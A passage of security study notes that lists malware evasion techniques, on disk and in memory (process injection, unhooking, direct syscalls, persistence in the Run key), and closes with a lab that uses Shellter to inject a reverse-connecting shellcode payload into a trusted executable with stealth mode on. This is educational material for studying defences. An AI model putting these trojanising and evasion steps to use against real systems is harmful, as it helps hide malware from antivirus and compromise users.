### 17. **Environment-Sensitive Malware (Virtual Machine or Sandbox Detection)**

- **How it works**: Malware detects if it is running in a virtual environment or sandbox and avoids executing if it detects such analysis tools. This prevents detection by sandbox-based AV systems.
- **Example**: Checking for the presence of certain virtual machine drivers or low system resources (common in sandboxes) before executing.

### 18. **Storing Malicious Code in Non-Executable Locations**

- **How it works**: Malware stores its code in locations that antivirus software may not scan (e.g., registry keys, Windows event logs, or configuration files) and then executes it from these non-standard locations.
- **Example**: Storing malicious scripts in the Windows Registry and launching them using legitimate system processes.

### 19. **Using Legitimate File Locations**

- **How it works**: Malware places itself in directories where legitimate applications or system files reside (e.g., `C:\\\\Windows\\\\System32` or `C:\\\\Program Files`) to blend in and avoid raising suspicion.
- **Example**: Placing a malicious executable in the `System32` folder and giving it a legitimate-looking name.

### 20. **Registry-Based Persistence**

- **How it works**: Malware writes its payload into the system registry to establish persistence. It can then execute its code each time the system starts without storing additional files on disk.
- **Example**: Writing a command to execute malware into a registry key like `HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run`.

### ‚áí A list of common **`on-memory evasion techniques`**, You Can Search!

> _**On-memory evasion techniques are strategies that malware uses to hide its presence and activities while running in memory, avoiding detection by antivirus (AV) or endpoint detection and response (EDR) systems that monitor memory. These techniques focus on evading real-time analysis, behavioral monitoring, and memory scanning.**_


> ***These on-memory evasion techniques make detection by antivirus and EDR solutions more difficult. Malware authors continuously evolve these methods to stay ahead of security defenses, often combining multiple techniques for greater evasion.***


### 1. **Process Injection**

- **How it works**: Malware injects malicious code into the memory space of legitimate, trusted processes (e.g., `explorer.exe` or `svchost.exe`). This allows the malware to run within the context of a trusted process, avoiding detection.
- **Common Techniques**:
    - **DLL Injection**: Injects a malicious DLL into the address space of a running process.
    - **Process Hollowing**: Replaces the code of a legitimate process with malicious code after the process is created but before it is executed.
    - **APC Injection**: Uses Asynchronous Procedure Calls (APCs) to queue malicious code to be executed in another process.
- **Example**: Injecting malicious code into `explorer.exe` to perform actions while bypassing security tools that trust the process.

### 2. **Reflective DLL Injection**

- **How it works**: Loads a malicious DLL into memory without using the standard Windows APIs that would normally register the DLL with the system. The DLL is injected and executed directly from memory, bypassing disk-based detection.
- **Example**: Reflectively injecting a malicious DLL into memory, which then executes without ever touching the disk or requiring traditional loading methods.

### 3. **Code Stomping**

- **How it works**: The malware overwrites its own malicious code in memory after execution to make detection more difficult. Security products that attempt to scan the memory will find overwritten or meaningless data instead of the malicious code.
- **Example**: A malicious payload that rewrites itself with random data after running its intended function, making post-execution memory scanning ineffective.

### 4. **Memory-Scraping Avoidance**

- **How it works**: Malware avoids storing sensitive information, such as encryption keys or credentials, in predictable memory locations. This prevents memory scrapers (used by forensics tools or security software) from easily capturing such data.
- **Example**: Malware using obfuscation or segmentation to prevent easy access to encryption keys in memory.

### 5. **API Hooking Evasion**

- **How it works**: Malware evades security tools by bypassing or unhooking APIs that are commonly monitored. These tools often hook into Windows APIs to track malicious behavior (e.g., file creation, network activity), so malware can hide by bypassing those APIs or using alternative system calls.
- **Example**: Malware unhooks AV hooks placed on Windows APIs like `NtCreateFile` to prevent the AV from monitoring file access.

### 6. **Direct System Calls**

- **How it works**: Malware directly calls system functions by bypassing the Windows API layer and accessing system-level functions in the kernel. This can evade API-based monitoring because security tools usually monitor the higher-level APIs.
- **Example**: Using direct system calls like `NtOpenProcess` instead of the higher-level Windows API `OpenProcess` to avoid detection by tools that monitor API calls.

### 7. **Stack Pivoting**

- **How it works**: Malware manipulates the stack pointer, pointing it to another area of memory, effectively hiding malicious code execution from security tools that monitor stack-based operations.
- **Example**: Malware changing the stack to point to malicious code stored in a different region of memory, making it harder for security tools to trace execution flow.

### 8. **Heap Spraying**

- **How it works**: Malware allocates large amounts of memory (heap) and fills it with malicious code. This makes it harder for detection systems to isolate or remove the malicious code, as it is scattered across the memory space.
- **Example**: Spraying shellcode across multiple memory regions to ensure it gets executed when the right conditions trigger an exploit.

### 9. **Memory Encryption (Self-Encrypting Malware)**

- **How it works**: Malware encrypts parts of itself in memory and decrypts only when needed for execution. This prevents static or real-time analysis tools from easily identifying malicious code while it resides in memory.
- **Example**: Ransomware encrypting its payload in memory until the point of execution to avoid detection.

### 10. **Code Obfuscation in Memory**

- **How it works**: Malware obfuscates its code in memory to avoid detection by signature-based memory scanning tools. This involves techniques such as instruction reordering, junk code insertion, or encrypting parts of the code that are only decrypted at runtime.
- **Example**: Injecting obfuscated shellcode into a process and decrypting or decoding it only during execution, so security tools scanning memory find only encrypted or junk data.

### 11. **API Spoofing**

- **How it works**: Malware manipulates or forges the API results to fool security tools into thinking that legitimate activity is happening when, in reality, malicious actions are taking place.
- **Example**: Spoofing `GetProcAddress` API calls to hide or misdirect the actual execution of malicious code.

### 12. **Thread Local Storage (TLS) Callbacks**

- **How it works**: Malware uses TLS callbacks to execute malicious code before the entry point of the main process. This technique allows the malware to run before standard security tools begin monitoring the process.
- **Example**: Malware that runs in the context of a legitimate process by executing code via TLS callbacks, which get triggered early in process execution.

### 13. **Inline Hooking**

- **How it works**: Malware modifies function pointers in the import table or modifies code directly in the memory space of legitimate processes, allowing it to intercept and redirect legitimate functions to malicious code.
- **Example**: Changing function pointers for commonly used APIs in the Import Address Table (IAT) to point to malicious code.

### 14. **Evading Memory Forensics (Anti-Debugging and Anti-Sandbox)**

- **How it works**: Malware detects if it is running in a virtualized or sandbox environment by checking for telltale signs (e.g., specific DLLs or CPU instructions) and adjusts its behavior accordingly. It may also detect debuggers and refuse to run if one is present.
- **Example**: Checking for the presence of sandbox artifacts, like specific memory layouts or unusual system configurations, before executing malicious payloads.

### 15. **PE Header Manipulation**

- **How it works**: Malware modifies its Portable Executable (PE) headers in memory to mislead forensic tools and make memory analysis difficult. By tampering with PE headers, the malware can hide its true identity or behavior.
- **Example**: Altering the PE header in memory to trick memory scanning tools into thinking the file is legitimate or tamper with process information.

### 16. **Dynamic Invocation (Indirect Execution)**

- **How it works**: Malware uses dynamic invocation techniques like `GetProcAddress` and `LoadLibrary` to resolve API functions dynamically during runtime. This avoids the need to import these functions at load time, which could trigger detection.
- **Example**: Using `GetProcAddress` to resolve and call APIs like `VirtualAlloc` or `WriteProcessMemory` instead of statically linking them, reducing the chance of detection by AV systems that monitor loaded modules.

### 17. **Unhooking**

- **How it works**: Malware removes or bypasses API hooks placed by security tools to monitor function calls. By unhooking critical APIs (such as `NtCreateFile` or `NtOpenProcess`), malware can prevent AV from observing key behaviors.
- **Example**: Malware unhooking `NtOpenProcess` to bypass AV that hooks into it to monitor process creation.

### 18. **Section Remapping**

- **How it works**: Malware remaps sections of a legitimate process's memory, modifying or replacing portions of its code. This allows the malware to execute its code while disguising itself as part of the legitimate process.
- **Example**: Remapping sections of `explorer.exe` to contain malicious payloads while making it look like legitimate code in memory.

### 19. **Heap Evasion**

- **How it works**: Malware avoids using the heap in predictable ways to evade detection. It may utilize custom memory management or avoid allocating memory in typical regions that security tools monitor.
- **Example**: Using custom heap management to allocate memory in regions of the process not usually monitored by security tools.

### 20. **Stack Buffer Manipulation**

- **How it works**: Malware manipulates stack buffers in a way that can confuse security tools or prevent them from analyzing the stack correctly. Stack-based evasion can involve techniques such as stack pivoting or creating hidden stack frames.
- **Example**: Crafting malicious payloads that exploit vulnerabilities like stack buffer overflows but conceal the malicious code by manipulating the stack layout.

### LAB Demo : AV Evasion With `Shelter`

**‚áí Objectives:** **How To Inject an shellcode into a legitimate executable and how can be used to evade AV.**

**Note That This is really basic old style way‚Ä¶**

```bash
## All Those steps are organized from 1 to whatever ...##
# Installing Shelter:
					# Be aware of its Limitations !!! {Search} it works on win32 only :) #
		~$ sudo apt-get update && sudo apt-get dist-upgrade -y
		~$ sudo apt-get install shellter -y
		~$ cd usr/share/windows-resources/shellter
		~$ sudo wine shellter.exe 
#----------------------------------------
# Injection Proccess Steps :
# 1- Download a Trusted executable, it should be simple and light !(vncveiwer.exe, etc..)
	->	Choose operation Mode Auto/Manual : # We Will Use A for Auto.
	->	PE Target : # Add The **Full Path For Your Exe Program** that you want to inject your shellcode in..
	-> Enable Stealth Mode ? : Y # This is Very Important,
				***# Its actually asks you if you want the exe to work as it should or not!*
	-> Next Will Ask you which payload to choose ..
	-> next add your IP address and PORT .
****#----------------------------------------
```

---


---

### ‚áí Recommended PowerShell courses:

1. [https://learn.microsoft.com/en-us/training/paths/powershell/](https://learn.microsoft.com/en-us/training/paths/powershell/)
2. [https://www.codecademy.com/learn/learn-powershell](https://www.codecademy.com/learn/learn-powershell)
3. [https://www.youtube.com/playlist?list=PLf2TKe70Vk1NMaSo4KFKPQGjA_acN9U4n](https://www.youtube.com/playlist?list=PLf2TKe70Vk1NMaSo4KFKPQGjA_acN9U4n)